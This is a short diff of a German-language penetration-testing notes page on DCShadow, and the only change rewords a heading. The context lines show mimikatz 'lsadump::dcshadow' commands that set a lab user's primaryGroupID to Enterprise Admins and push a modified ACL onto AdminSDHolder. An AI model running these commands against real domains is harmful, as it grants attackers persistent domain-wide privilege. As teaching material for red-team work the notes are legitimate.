@@ -49,7 +49,7 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
-## Shadowception - Berechtigungen für DCShadow mit DCShadow vergeben (keine modifizierten Berechtigungsprotokolle)
+## Shadowception - DCShadow-Berechtigungen mit DCShadow vergeben (keine modifizierten Berechtigungsprotokolle)
 
 Wir müssen die folgenden ACEs mit der SID unseres Benutzers am Ende anhängen:
 
